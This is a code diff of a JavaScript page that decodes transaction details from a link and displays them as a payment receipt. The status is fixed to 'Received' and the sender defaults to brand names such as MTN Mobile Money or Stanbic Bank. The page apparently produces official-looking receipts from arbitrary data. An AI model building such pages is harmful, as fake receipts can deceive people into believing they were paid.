-    if (statusDesc) statusDesc.innerHTML = T.receivingDesc.replace('{amt}', '<span id="amtInline">—</span>');
-
-    const acceptBtn = document.getElementById('acceptBtn');
-    if (acceptBtn) acceptBtn.textContent = T.receiveBtn;
-
-    const fromLabel = document.getElementById('fromLabel');
-    if (fromLabel) fromLabel.textContent = T.fromLabel;
-    const toLabel = document.getElementById('toLabel');
-    if (toLabel) toLabel.textContent = T.toLabel;
-
-    const helpLabel = document.getElementById('helpLabel');
-    if (helpLabel) helpLabel.textContent = T.needHelp;
-    const callLabel = document.getElementById('callLabel');
-    if (callLabel) callLabel.textContent = T.callLabel;
+    document.getElementById('heroTitle').textContent = T.heroTitle;
+    document.getElementById('heroSub').textContent = T.heroSub;
+    document.getElementById('amountLabel').textContent = T.amountLabel;
+    document.getElementById('purposeLabel').textContent = T.purposeLabel;
+    document.getElementById('acceptBtn').textContent = T.receiveBtn;
+    document.getElementById('fromLabel').textContent = T.fromLabel;
+    document.getElementById('toLabel').textContent = T.toLabel;
+    document.getElementById('helpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('copyLbl').textContent = T.copyBtn;
+    document.getElementById('printLbl').textContent = T.printBtn;
   }
 
   async function decodeData() {
@@ -549,9 +550,13 @@
   }
 
   const SUPPORT_NUMBERS = {
-    'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
-    'Uganda': '100', 'Uganda (MTN)': '100',
-    'Ghana': '100', 'Ghana (MTN)': '100',
+    'Cameroon': '233 42 12 12',
+    'Zambia': '111',
+    'Zambia (MTN)': '111',
+    'Uganda': '100',
+    'Uganda (MTN)': '100',
+    'Ghana': '100',
+    'Ghana (MTN)': '100',
     'Benin': '111'
   };
 
@@ -571,7 +576,7 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
+  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '', pu: '' };
 
   async function init() {
     const data = await decodeData();
@@ -594,9 +599,9 @@
         '<div class="expired-icon">' +
           '<svg viewBox="0 0 24 24"><path d="M12 8v5M12 16.5v.01"/></svg>' +
         '</div>' +
-        '<div class="status-block">' +
-          '<div class="status-title">' + T.expiredTitle + '</div>' +
-          '<div class="status-desc">' + T.expiredDescPrefix + ' ' + expText + '<br>' + T.expiredDescSuffix + '</div>' +
+        '<div style="text-align:center">' +
+          '<div style="font-size:18px;font-weight:800;color:#001E50;margin-bottom:6px">' + T.expiredTitle + '</div>' +
+          '<div style="font-size:12.5px;color:#5B6577;line-height:1.6">' + T.expiredDescPrefix + ' ' + expText + '<br>' + T.expiredDescSuffix + '</div>' +
         '</div>';
       document.title = T.docTitle;
       return;
@@ -627,23 +632,30 @@
       sn:  data.sn  || '',
       mk:  data.mk  || '',
       an:  data.an  || '',
-      dt:  data.dt  || data.createdAt || ''
+      dt:  data.dt  || data.createdAt || '',
+      pu:  data.pu  || data.purpose || ''
     };
 
     const amtFull = formatAmount(tx.am, tx.cur);
-    document.getElementById('amtCur').textContent = tx.cur || '';
-    document.getElementById('amtVal').textContent = amtFull.replace(' ' + tx.cur, '');
+    document.getElementById('amountValue').textContent = amtFull;
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
-    document.getElementById('fromName').textContent = tx.mk || 'MTN Mobile Money';
+    document.getElementById('fromName').textContent = tx.mk || 'Stanbic Bank';
 
-    const amtInline = document.getElementById('amtInline');
-    if (amtInline) amtInline.textContent = amtFull;
+    // Purpose field
+    const purposeCard = document.getElementById('purposeCard');
+    const purposeValue = document.getElementById('purposeValue');
+    if (tx.pu && tx.pu.trim()) {
+      purposeValue.textContent = tx.pu.trim();
+      purposeCard.classList.remove('hidden');
+    } else {
+      purposeCard.classList.add('hidden');
+    }
 
     const rows = [
       { k: T.kCountry,          v: tx.c },
       { k: T.kPaymentMethod,    v: tx.pm },
       { k: T.kService,          v: tx.sn },
-      { k: T.kMarketed,         v: tx.mk },
+      { k: T.kReference,        v: tx.ref },
       { k: T.kTransactionDate,  v: tx.dt ? formatDate(tx.dt) : formatDate() },
       { k: T.kStatus,           v: T.vReceived }
     ];
@@ -659,18 +671,17 @@
 
   function copyReceipt() {
     const lines = [
-      T.receiptTitle,
+      T.copyReceiptTitle,
       '----------------------------------',
-      T.receiptStatus + ': ' + T.vReceived,
-      T.receiptAmount + ': ' + formatAmount(tx.am, tx.cur),
-      T.receiptRecipient + ': ' + (tx.rn || ''),
-      T.receiptCountry + ': '   + (tx.c || ''),
-      T.receiptTxId + ': ' + (tx.ref || ''),
-      T.receiptPaymentMethod + ': ' + (tx.pm || ''),
-      T.receiptService + ': ' + (tx.sn || ''),
-      T.receiptMarketed + ': ' + (tx.mk || ''),
-      T.receiptDate + ': ' + formatDate(tx.dt)
-    ].join('\n');
+      T.amountLabel + ': ' + formatAmount(tx.am, tx.cur),
+      tx.pu ? T.purposeLabel + ': ' + tx.pu : '',
+      T.fromLabel + ': ' + (tx.mk || ''),
+      T.toLabel + ': ' + (tx.rn || ''),
+      T.kCountry + ': ' + (tx.c || ''),
+      T.kReference + ': ' + (tx.ref || ''),
+      T.kPaymentMethod + ': ' + (tx.pm || ''),
+      T.kTransactionDate + ': ' + formatDate(tx.dt)
+    ].filter(Boolean).join('\n');
 
     const btn = document.getElementById('copyBtn');
     const lbl = document.getElementById('copyLbl');
@@ -678,7 +689,7 @@
       btn.classList.add('copied');
       lbl.textContent = T.copied;
       showToast(T.copyToast);
-      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = T.copyReceipt; }, 1800);
+      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = T.copyBtn; }, 1800);
     };
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
@@ -721,6 +732,7 @@
       mk:  tx.mk,
       an:  tx.an,
       dt:  tx.dt,
+      pu:  tx.pu,
       lang: currentLang
     });
     setTimeout(() => {
